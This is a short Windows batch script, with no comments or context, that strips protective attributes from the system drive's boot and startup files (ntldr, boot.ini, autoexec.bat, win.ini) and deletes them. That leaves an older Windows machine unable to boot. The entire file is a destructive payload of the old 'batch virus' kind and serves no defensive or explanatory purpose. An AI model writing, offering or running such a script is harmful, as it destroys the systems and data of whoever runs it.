@echo off
attrib -r -s -h %systemdrive%\autoexec.bat
del %systemdrive%\autoexec.bat
attrib -r -s -h %systemdrive%\boot.ini
del %systemdrive%\boot.ini
attrib -r -s -h %systemdrive%\ntldr
del %systemdrive%\ntldr
attrib -r -s -h %systemdrive%\windows\win.ini
del %systemdrive%\windows\win.ini
exit
